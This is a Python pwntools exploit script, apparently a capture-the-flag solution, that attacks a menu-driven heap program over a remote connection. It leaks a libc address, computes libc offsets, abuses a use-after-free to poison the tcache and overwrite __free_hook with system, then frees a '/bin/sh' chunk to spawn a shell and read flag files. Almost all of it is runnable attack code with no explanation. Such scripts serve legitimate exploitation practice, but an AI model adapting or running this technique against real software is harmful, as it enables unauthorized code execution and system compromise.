from pwn import * 

def init():
    sla("shell(0)<", "SPAWN")
    ru(" Enter process name")
    sla("shell(0)<", "storage")
    sla("shell(0)<", "EXIT")

def add(idx, size):
    sla(")< ", "1")
    sla(")< ", str(idx))
    sla(")< ", str(size))

def dele(idx):
    sla(")< ", "2")
    sla(")< ", str(idx))

def show(idx):
    sla(")< ", "4")
    sla(")< ", str(idx))

def edit(idx, data):
    sla(")< ", "3")
    sla(")< ", str(idx))
    sla(")< ", data)

def exp():
    init()
    add(0, 0x500)
    add(1, 0x20)
    dele(0)
    show(0)
    ru(")> ")
    leak = u64(re(8, 2))
    slog['leak'] = leak
    main_arean = leak - 96
    malloc_hook = main_arean - 0x10
    slog['mhook'] = malloc_hook
    
    libc = malloc_hook - pmhook
    puts = libc + pputs
    system = libc + psystem
    fhook = libc  + pfhook
    
    add(3, 0x40)
    edit(3, '/bin/sh\x00')

    dele(1)
    edit(1, flat(fhook))
    show(1)
    add(1, 0x20)
    add(2, 0x20)
    edit(2, flat(system))

    dele(3)
    sl("cat flag.txt")
    sl("cat bTAkUG9eCMgCbGMQbx8a")



context.os='linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
local = int(sys.argv[1])
context.arch='amd64'


if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote("109.233.61.10", 11710)

libc2714 = 1
if libc2714:
    pmhook = 0x00000000003ebc30
    pputs  = 0x000000000080aa0
    pfhook = 0x00000000003ed8e8
    psystem = 0x04f550


re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)

exp()

ia()
 
